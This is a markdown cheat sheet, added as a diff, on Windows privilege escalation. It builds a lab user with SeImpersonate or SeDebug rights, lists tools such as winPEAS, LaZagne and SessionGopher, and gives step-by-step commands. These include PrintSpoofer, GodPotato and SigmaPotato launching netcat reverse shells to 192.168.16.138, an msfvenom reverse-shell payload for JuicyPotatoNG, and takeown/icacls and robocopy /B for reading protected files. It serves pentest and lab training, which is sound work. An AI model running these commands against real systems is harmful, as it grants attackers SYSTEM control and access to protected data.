@@ -1,0 +1,249 @@
+# Windows Privilege Escalation
+
+## Toolkit&#x20;
+
+<table data-search="false"><thead><tr><th width="165.20001220703125">Tool</th><th>Description</th></tr></thead><tbody><tr><td><a href="https://github.com/GhostPack/Seatbelt">Seatbelt</a></td><td>C# project for performing a wide variety of local privilege escalation checks</td></tr><tr><td><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">winPEAS</a></td><td>WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts. All of the checks are explained <a href="https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html">here</a></td></tr><tr><td><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1">PowerUp</a></td><td>PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found</td></tr><tr><td><a href="https://github.com/GhostPack/SharpUp">SharpUp</a></td><td>C# version of PowerUp</td></tr><tr><td><a href="https://github.com/411Hall/JAWS">JAWS</a></td><td>PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0</td></tr><tr><td><a href="https://github.com/Arvanaghi/SessionGopher">SessionGopher</a></td><td>SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information</td></tr><tr><td><a href="https://github.com/rasta-mouse/Watson">Watson</a></td><td>Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.</td></tr><tr><td><a href="https://github.com/AlessandroZ/LaZagne">LaZagne</a></td><td>Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more</td></tr><tr><td><a href="https://github.com/bitsadmin/wesng">Windows Exploit Suggester - Next Generation</a></td><td>WES-NG is a tool based on the output of Windows' <code>systeminfo</code> utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10, including their Windows Server counterparts, is supported</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">Sysinternals Suite</a></td><td>We will use several tools from Sysinternals in our enumeration including <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">AccessChk</a>, <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist">PipeList</a>, and <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psservice">PsService</a></td></tr></tbody></table>
+
+We can also find pre-compiled binaries of `Seatbelt` and `SharpUp` [here](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries), and standalone binaries of `LaZagne` [here](https://github.com/AlessandroZ/LaZagne/releases/). It is recommended that we always compile our tools from the source if using them in a client environment.
+
+{% hint style="info" %}
+**Note**_**:**_
+
+&#x20;_Depending on how we gain access to a system we may not have many directories that are writeable by our user to upload tools. It is always a safe bet to upload tools to `C:\Windows\Temp` because the `BUILTIN\Users` group has write access._
+{% endhint %}
+
+## Abusing SeImpersonate Privilege&#x20;
+
+<details>
+
+<summary><strong>Creating the vulnerable Environment</strong></summary>
+
+## Create user&#x20;
+
+{% code overflow="wrap" %}
+```cmd
+net user <username> <password> /add
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1874).png" alt=""><figcaption></figcaption></figure>
+
+## Assign Privileges
+
+{% code overflow="wrap" %}
+```
+Win + R
+→ secpol.msc
+→ Local Policies
+→ User Rights Assignment
+→ Impersonate a client after authentication
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1875).png" alt=""><figcaption></figcaption></figure>
+
+## Verify&#x20;
+
+Open the cmd with administrator in `esc_priv_user` and check permissions.&#x20;
+
+<figure><img src="../../.gitbook/assets/image (1876).png" alt=""><figcaption></figcaption></figure>
+
+</details>
+
+SeImpersonatePrivilege is a Windows privilege that allows a process to **impersonate the security token of another account** that connects to it. It is granted by default to service accounts like those running **IIS and SQL Server**, which is exactly why it is the most common Windows escalation path: an attacker who lands as such a service account uses a **Potato attack** to trick a SYSTEM process into authenticating, captures its token, and becomes **SYSTEM**. The first check on any Windows host is `whoami /priv`.
+
+### Check Privilege&#x20;
+
+{% code overflow="wrap" %}
+```
+whoami /priv
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1878).png" alt=""><figcaption></figcaption></figure>
+
+### Using PrintSpoofer.exe
+
+{% code overflow="wrap" %}
+```cmd
+.\PrintSpoofer64.exe -c "C:\Tools\nc.exe 192.168.16.138 9090 -e cmd"
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1877).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (1879).png" alt=""><figcaption></figcaption></figure>
+
+### &#x20;Using GodPotato&#x20;
+
+{% code overflow="wrap" %}
+```cmd
+.\GodPotato-Net4.exe -cmd "cmd /c C:\Tools\nc.exe 192.168.16.138 9000 -e cmd"
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1880).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (1881).png" alt=""><figcaption></figcaption></figure>
+
+### Using SigmaPotato.exe&#x20;
+
+{% code overflow="wrap" %}
+```cmd
+.\SigmaPotato.exe --revshell 192.168.16.138 9000
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1882).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (1883).png" alt=""><figcaption></figcaption></figure>
+
+### Using JuicyPotatoNG.exe&#x20;
+
+{% code overflow="wrap" %}
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.16.138 LPORT=4545 -f exe -o shell.exe
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1884).png" alt=""><figcaption></figcaption></figure>
+
+{% code overflow="wrap" %}
+```bash
+JuicyPotatoNG.exe -t * -p C:\Users\esc_priv_user\Downloads\shell.exe -l 4545
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1885).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (1886).png" alt=""><figcaption></figcaption></figure>
+
+## Abusing SeDebugPrivilege Privilege
+
+<details>
+
+<summary><strong>Create the vulnerable environment</strong></summary>
+
+This privilege can be assigned via local or domain group policy, under `Local Security Policy > Security Settings > User right Assignments > Debug Program > Add user`.&#x20;
+
+<figure><img src="../../.gitbook/assets/image (1887).png" alt=""><figcaption></figcaption></figure>
+
+
+
+</details>
+
+To run a particular application or service or assist with troubleshooting, a user might be assigned the SeDebugPrivilege instead of adding the account into the administrators group.
+
+{% hint style="info" %}
+_By default, only administrators are granted this privilege as it can be used to capture sensitive information from system memory, or access/modify kernel and application structures. This right may be assigned to developers who need to debug new system components as part of their day-to-day job._
+{% endhint %}
+
+### Identify Privileges&#x20;
+
+{% code overflow="wrap" %}
+```cmd
+whoami /priv
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1888).png" alt=""><figcaption></figcaption></figure>
+
+### Identify the parent process PID
+
+{% hint style="info" %}
+_We target `winlogon.exe` because it normally runs as **SYSTEM**, making it a suitable privileged parent process for a `SeDebugPrivilege`-based escalation._
+{% endhint %}
+
+{% code overflow="wrap" %}
+```cmd
+tasklist /v | findstr "winlogon.exe"
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1889).png" alt=""><figcaption></figcaption></figure>
+
+### Escalate Privileges&#x20;
+
+Download tool [here](https://github.com/decoder-it/psgetsystem).&#x20;
+
+<figure><img src="../../.gitbook/assets/image (1890).png" alt=""><figcaption></figcaption></figure>
+
+## Unauthorized File Read/Write
+
+### Using SeTakeOwnership Privileges (Write)
+
+_SeTakeOwnership allows a user to take ownership of securable objects such as files, folders, registry keys, services, etc. After becoming the owner, you may need to modify the ACL to actually access the object._
+
+#### Identify Privileges&#x20;
+
+{% code overflow="wrap" %}
+```
+whoami /priv
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1893).png" alt=""><figcaption></figcaption></figure>
+
+#### Take Ownership
+
+After taking the ownership the file can even be modified as well.&#x20;
+
+```
+takeown /f <file>
+icacls <file> /grant <our user>:F
+type <file>
+```
+
+<figure><img src="../../.gitbook/assets/image (1894).png" alt=""><figcaption></figcaption></figure>
+
+### Using SeBackupPrivilege (Read)
+
+#### Check Our Privileges&#x20;
+
+{% code overflow="wrap" %}
+```cmd
+whoami /groups
+whoami /priv
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1897).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (1896).png" alt=""><figcaption></figcaption></figure>
+
+#### Enable SeBackupPrivilege
+
+{% code overflow="wrap" %}
+```powershell
+Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+Get-SeBackupPrivilege
+Set-SeBackupPrivilege
+Get-SeBackupPrivilege
+whoami /priv
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1898).png" alt=""><figcaption></figcaption></figure>
+
+#### Access Unauthorized Files&#x20;
+
+1. **Using SeBackupPrivilege DLLs**
+
+{% code overflow="wrap" %}
+```cmd
+Copy-FileSeBackupPrivilege C:\Secret\imp.txt .\secretfile.txt
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1899).png" alt=""><figcaption></figcaption></figure>
+
+2. **Using robocopy**
+
+{% code overflow="wrap" %}
+```
+robocopy /B C:\Secret .\ imp.txt
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1900).png" alt=""><figcaption></figcaption></figure>
